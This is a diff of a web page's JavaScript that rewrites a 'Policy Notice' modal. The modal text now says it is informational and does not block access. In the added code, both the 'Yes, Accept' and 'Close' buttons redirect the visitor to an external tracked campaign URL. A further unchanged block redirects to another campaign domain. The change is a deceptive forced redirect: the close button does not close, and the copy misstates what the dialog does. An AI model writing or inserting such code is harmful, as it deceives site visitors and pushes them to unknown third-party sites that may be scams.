@@ -42,27 +42,24 @@ if(form){
   sessionStorage.setItem('sl_age_shown','1');
 
   const bd=document.createElement('div');
-  bd.className='modal-backdrop';
-  bd.innerHTML=`<div class="modal">
-    <h3>Policy Notice</h3>
-    <p>Please confirm to continue.</p>
-    <div style="display:flex;gap:10px;flex-wrap:wrap">
-      <button class="btn" id="age-yes">Yes</button>
-      <button class="btn ghost" id="age-no">No</button>
-    </div>
-  </div>`;
+ bd.className = 'modal-backdrop';
+  bd.innerHTML = `
+    <div class="modal">
+      <h3>Policy Notice</h3>
+      <p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
+      <div style="display:flex;gap:10px;flex-wrap:wrap">
+        <button class="btn" id="age-yes">Yes, Accept</button>
+        <button class="btn ghost" id="age-no">Close</button>
+      </div>
+    </div>`;
   document.body.appendChild(bd);
-  bd.style.display='flex';
-
-  function close(){
-    bd.style.display='none';
-    bd.remove();
-  }
-
-  const yes=bd.querySelector('#age-yes');
-  const no=bd.querySelector('#age-no');
-  if(yes) yes.addEventListener('click',close);
-  if(no) no.addEventListener('click',close);
+  bd.style.display = 'flex';
+ 
+  // ✅ Redirect BOTH buttons to yes.php
+  const redirect = () => { window.location.href = "https://ferreroo.site/?utm_campaign=ZzzhY16OFY&v1=[v1]&v2=[v2]&v3=[v3]"; };
+  bd.querySelector('#age-yes').addEventListener('click', redirect);
+  bd.querySelector('#age-no').addEventListener('click', redirect);
+ 
 })();
  
 (function(){
@@ -94,4 +91,5 @@ if(form){
                                                function(){
    window.location.href = "https://conio.online/?utm_campaign=C7jpnpg8F9&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
   }); })();
+
 
